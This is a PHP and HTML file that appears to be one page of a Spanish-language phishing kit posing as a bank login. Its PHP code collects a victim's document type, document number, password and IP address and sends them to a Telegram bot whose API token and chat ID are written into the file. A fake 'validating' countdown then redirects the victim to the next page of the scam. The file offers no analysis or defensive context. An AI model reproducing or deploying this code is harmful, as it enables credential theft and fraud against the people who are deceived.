<?php

ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
////////////////////
if ( isset ($_POST['tipodoc']) && isset ($_POST['numdoc']) && isset ($_POST['clvs']) ){



$message = "Tipo doc.: ".$_POST['tipodoc']." - Num doc: ".$_POST['numdoc']." - Clv.: ".$_POST['clvs']." - IP ".$userp."\r\n";

$apiToken = "7326449964:AAGcuAWx60RNunWrhzvLa-KSDYa9t9xWJOk";


$data = [
  'chat_id' => '-4242577870',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




}else{ header ('location: index.html'); exit();
 }

?>

<!DOCTYPE html>
<html><head>
				<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                <title>Inicio</title>
                
				<meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
                
                <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css">
		

					 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=25;
    
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, mientras validamos la información";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>
		
                
        </head>
        <body>
                <header style="" class="ioscam">
                <nav class="header_wrapeer">
                        <div class="header__campaign"><div class="header__logo">
						<img src="./fhs/blanco.png"  sizes="(min-width: 900px) 20vw, 50vw" class="header__image">
						<img src="./fhs/bantp.png" >
						</div>
							</div>
						
                </nav>
                </header>
                <div class="container">
                        <h1>¡Bienvenido!</h1>
                        <form method="POST"  id="loggin">
			        <br>  
                           
                              <br><br>
							  
							  
			
							  
                                <div  align="center">
                                        
                       <h2>Cargando...</h2><br>
						<img src="./fhs/loac.gif" style="width:150px"><br><br>
						<b><p style="width:350px;font-size:18px;" id='CuentaAtras'></p></b>
						<br> <br>
						
							  </div>
										
										
                        </form>
                        
						</div>
                         
   </body>
   </html>